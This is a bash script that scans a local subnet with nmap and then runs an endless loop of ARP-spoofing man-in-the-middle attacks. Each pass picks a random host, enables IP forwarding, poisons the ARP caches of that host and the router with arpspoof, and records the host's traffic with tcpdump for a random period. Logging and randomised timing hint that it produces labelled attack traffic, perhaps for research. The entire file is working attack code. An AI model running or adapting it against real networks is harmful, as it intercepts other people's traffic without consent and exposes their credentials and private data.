#!/bin/bash

me=$$
i=0


#get the IPs on the network
IPS=$(nmap -n -sn 192.168.200.0/24 -oG - | awk '/Up$/{print $2}')
arrIPS=($IPS)
router="192.168.200.1"
Arpspoof="nohup arpspoof -i wlan0 -t " #nohup to run it in the background 
sep=" "
noout=" &>/dev/null &"

printf "Initial verification of IPs and MACs: \n" 2>&1 | tee -a arpspoof_output/arpspoof_log.txt -a arpspoof_output/arpspoof_terminal_output.txt
sudo arp-scan 192.168.200.0/24 2>&1 | tee -a arpspoof_output/arpspoof_log.txt -a arpspoof_output/arpspoof_terminal_output.txt
printf "\n\n"

printf "\n ** Starting arpspoof attacks for the following IPs\n: $IPS" 2>&1 | tee -a arpspoof_output/arpspoof_log.txt -a arpspoof_output/arpspoof_terminal_output.txt

printf "\n\n"

while true
do 
    i=$((i+1))
    RANDOM=$$$(date +%s)
    Random_IP=${arrIPS[$RANDOM % ${#arrIPS[@]} ]}
    printf "\n\n\nITERATION $i :\n"

    if [ "$Random_IP" = "192.168.200.1" ]; then
        printf "* IP DISCARDED: router\'s IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        i=$((i-1))
    elif [ "$Random_IP" = "192.168.200.134" ]; then
        printf "* IP DISCARDED: attacker\'s IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        i=$((i-1))
    elif [ "$Random_IP" = "192.168.200.2" ]; then
        printf "* IP DISCARDED: restricted IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        i=$((i-1))
    elif [ "$Random_IP" = "192.168.200.3" ]; then
        printf "* IP DISCARDED: restricted IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        i=$((i-1))
    elif [ "$Random_IP" = "192.168.200.133" ]; then
        printf "* IP DISCARDED: GGs laptop\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        i=$((i-1))
    else
        printf "$i) $Random_IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf "A) Setting IP forwarding..."
        echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward  #Set up IP forwarding

        start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "\nB) Executing : $Arpspoof$Random_IP$sep$router$noout\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf $(eval $Arpspoof$Random_IP$sep$router$noout)

        printf "\nC) Executing : $Arpspoof$router$sep$Random_IP$noout\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf $(eval $Arpspoof$router$sep$Random_IP$noout)
   
        printf "\nD) Executing : TCPDUMP $i - $Random_IP\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        Tcpdump="tcpdump -i wlan0 -s 65535 -w ./arpspoof_output/arpspoof_tcpdump/tcpdump$i-$Random_IP.pcap"
        printf $(eval $Tcpdump) & scriptTCPDUMP=$!
        sleep 5

        Random_Time=$(shuf -i30-600 -n1) #from 30 sec to 10 minutes
        printf "\nE) Attack duration: $Random_Time\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        sleep $Random_Time #change to Random_Time
         
        printf "\nF) Finishing the attack...\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf "\n F-1) Killing all arpspoof...\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        killall arpspoof 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf "\n F-4) Killing $scriptTCPDUMP...\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        kill $scriptTCPDUMP 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf "\n F-5) Killing all tcpdump - to reassure...\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        killall tcpdump 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        
        printf "\nG) Disabling IP forwarding..." 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward  #Sets up IP forwarding

        stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "\n\nSUMMARY of iteration $i: \n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        printf "\n$i)start: $start_current_time , stop: $stop_current_time [duration: $Random_Time] \' ARPSPOOF ON $Random_IP and $router \' \n" 2>&1 | tee -a arpspoof_output/arpspoof_log.txt -a arpspoof_output/arpspoof_terminal_output.txt
        
        Random_Sleep=$(shuf -i30-120 -n1) #from 30 sec to 2 minutes
        printf "\nH) Sleeping for: $Random_Sleep seconds\n" 2>&1 | tee -a arpspoof_output/arpspoof_terminal_output.txt
        sleep $Random_Sleep #change to Random_Sleep
        
    fi
    
done

